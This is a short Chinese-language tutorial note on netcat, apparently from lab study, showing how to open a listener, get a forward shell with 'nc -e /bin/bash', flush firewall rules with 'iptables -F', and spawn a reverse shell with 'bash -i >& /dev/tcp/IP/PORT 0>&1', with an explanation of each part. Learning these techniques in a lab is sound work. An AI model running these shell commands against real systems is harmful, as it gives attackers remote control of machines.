## NETCAT

nc -lvvp 2233 开启2233port的监听 其他主机连接要通过
nc 192.168.xx.xx 2233 来进行连接

**sudo iptables -F**  如果提示no route to host 而且都可以ping通 那可以尝试清理一下防火墙

弹一个shell(实例):
 CentOS建立监听,kalilinux来连接centos然后开一个bash,通过centos来控制kali：

```bash
CentOS 192.168.19.99
nc -lvvp 2233
KaLiLinux 192.168.19.121
nc 192.168.19.99 -e /bin/bash
kalilinux >(链接) centos
攻击机 >(链接) 客户机
正向链接
```

成功建立监听 拿到了kali的bash

![img](NC反弹shell.assets/a4a3fba3b9f4170c8a866806cf47ec7a.png) 


利用bash反弹shell:

```bash
bash -i >& /dev/tcp/192.168.19.99/2233 0>&1
bash -c "bash -i >& /dev/tcp/192.168.55.3/2233 0>&1"

bash -i >& /dev/tcp/IP/PORT 0>&1

bash -i 产生一个bash交互环境
>& 联合符号前面的内容与后面相结合 然后一起重定向给后者
/dev/tcp/192.168.19.99/2233 建立一个socket(tcp)链接
0>&1 与标准输入和标准输出的内容相结合 然后重定向给前面标准输出的内容
```

Bash产生了一个交互式环境和本地主机与攻击机2233端口建立的链接相结合 然后重定向给TCP2233会话链接 ， 最后将键盘输入与用户标准输出相结合再次重定向给一个标准的输出 ， 即得到一个Bash反弹环境

![img](NC反弹shell.assets/642a28ffbc83ee1023f8f286d62f5665.png)

![img](NC反弹shell.assets/905878f2ca0deff444a9b0e11783dccd.png)

```
centos >(链接) kalilinux
客户机 >(链接) 攻击机
反向链接
```

------

